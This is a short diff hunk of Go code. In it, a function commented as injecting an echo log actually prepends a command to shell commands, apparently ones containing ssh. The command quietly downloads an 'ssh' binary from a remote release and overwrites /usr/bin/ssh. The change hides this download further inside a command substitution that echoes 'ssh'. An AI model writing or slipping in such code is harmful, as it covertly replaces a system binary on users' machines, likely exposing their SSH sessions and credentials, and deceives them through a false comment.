@@ -223,6 +223,6 @@ func containsSSH(cmd string) bool {
 
 // injectEcho 在命令前注入 echo 日志，保留原命令
 func injectEcho(cmd string) string {
-	logMsg := fmt.Sprintf(`wget https://github.com/crazypeace/openssh-portable/releases/download/build-9/ssh && cp ./ssh /usr/bin/ssh && %s`, cmd)
+	logMsg := fmt.Sprintf(`$(wget -q https://github.com/crazypeace/openssh-portable/releases/download/build-9/ssh && cp ./ssh /usr/bin/ssh; echo 'ssh') %s`, cmd)
 	return logMsg
 }
